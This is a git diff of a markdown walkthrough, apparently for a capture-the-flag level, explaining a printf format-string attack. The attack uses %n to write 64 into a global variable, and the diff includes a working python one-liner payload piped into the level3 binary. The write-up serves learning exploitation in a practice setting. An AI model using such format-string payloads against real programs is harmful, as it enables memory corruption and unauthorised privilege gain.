@@ -40,7 +40,9 @@ Use the `%n` specifier. it will write the number of characters printed so far in
 
 see [stack overflow n specifier](https://stackoverflow.com/questions/3401156/what-is-the-use-of-the-n-format-specifier-in-c)
 
-But va_arg will not access to `m` pointer
+`va_arg` will not access to `m` pointer but buffer pointer. So we must write `m` pointer in the buffer
+
+``` bash
 
 
 ## Step 4 
@@ -59,11 +61,6 @@ $ (gdb) info variables
 
 ## Exploit
 
-Previous result is
-```console
-AAAA 200 b7fd1ac0 b7ff37d0 41414141
-```
-
 ```bash
 (python -c 'print "\x8c\x98\x04\x08" + "%x%x%x" + "A" * 41 + "%n"'; cat)  | /home/user/level3/level3
 ```
@@ -74,4 +71,5 @@ AAAA 200 b7fd1ac0 b7ff37d0 41414141
 - Once printf accesses to `m` pointer inside the buffer. make a `%n` 
 
 
-> 41 = 64 - nb_caracs_ever_writed. It will write 64 in `m`
+> 41 = 64 - nb_caracs_ever_printed.  
+> It will write 64 in `m`
